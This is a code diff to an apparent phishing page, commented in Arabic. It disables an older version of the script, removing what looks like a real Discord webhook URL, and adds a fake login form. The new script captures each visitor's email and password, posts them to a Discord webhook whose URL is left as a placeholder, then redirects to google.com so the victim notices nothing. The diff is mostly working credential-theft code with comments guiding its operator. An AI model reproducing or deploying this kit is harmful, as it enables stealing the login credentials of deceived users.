@@ -445,6 +445,7 @@
     }
 </script>
 
+<!--
 <script>
 document.querySelector('form').addEventListener('submit', function(e) {
     e.preventDefault(); // بيمنع الصفحة إنها تعمل ريفريش وتضيع البيانات
@@ -457,7 +458,7 @@ document.querySelector('form').addEventListener('submit', function(e) {
     const passwordVal = passwordInput ? passwordInput.value : "غير معروف";
 
     // 2. حط رابط الديسكورد ويبهوك بتاعك هنا بين علامتين التنصيص
-    const discordWebhookUrl = "https://discord.com/api/webhooks/1527466086075863131/JdF1EJ1O8cy2qjKqxOrBy7Z3IH4F-nH51uviJLDEScw5Kqf3VdEKlEMrou7NZvKyT3HF";
+    const discordWebhookUrl = "....";
 
     // 3. هنجهز الرسالة اللي هتروح لديسكورد بشكل منظم
     const payload = {
@@ -481,6 +482,64 @@ document.querySelector('form').addEventListener('submit', function(e) {
         // حتى لو حصل خطأ حوله برضه علشان التجربة تفضل مستمرة
         window.location.href = "https://www.google.com";
     });
+});
+</script>
+-->
+
+
+
+<!-- تأكد من تعديل الـ Form في كود الـ HTML الخاص بك ليكون بهذا الشكل ليتوافق مع السكريبت -->
+<form id="loginForm">
+    <!-- حقول الإدخال الخاصة بك هنا -->
+    <input type="email" id="email" required>
+    <input type="password" id="password" required>
+    <button type="submit" id="submitBtn">تسجيل الدخول</button>
+</form>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('loginForm');
+    
+    // تأكدنا من أن العنصر موجود قبل ربطه لتجنب خطأ (Cannot read properties of null)
+    if (form) {
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault(); // منع الصفحة من إعادة التحميل الافتراضية
+
+            const emailValue = document.getElementById('email').value;
+            const passwordValue = document.getElementById('password').value;
+
+            // ضع رابط الـ Webhook الخاص بك هنا
+            const webhookURL = "ضع_رابط_الـ_WEBHOOK_الخاص_بك_هنا"; 
+
+            // تحضير البيانات بالتنسيق الصحيح الذي يقبله ديسكورد
+            const payload = {
+                content: `🔔 **بيانات جديدة مستلمة:**\n**البريد الإلكتروني:** ${emailValue}\n**كلمة المرور:** ${passwordValue}`
+            };
+
+            try {
+                // إرسال البيانات إلى ديسكورد والانتظار حتى اكتمال الطلب قبل التوجيه
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log("تم إرسال البيانات بنجاح إلى ديسكورد!");
+                    // التوجيه إلى موقع جوجل الحقيقي بعد التأكد من وصول البيانات
+                    window.location.replace("https://www.google.com");
+                } else {
+                    console.error("فشل الإرسال، كود الاستجابة:", response.status);
+                }
+            } catch (error) {
+                console.error("حدث خطأ أثناء الاتصال بالشبكة:", error);
+            }
+        });
+    } else {
+        console.error("لم يتم العثور على عنصر الفورم loginForm في الصفحة. تأكد من مطابقة الـ ID.");
+    }
 });
 </script>
 
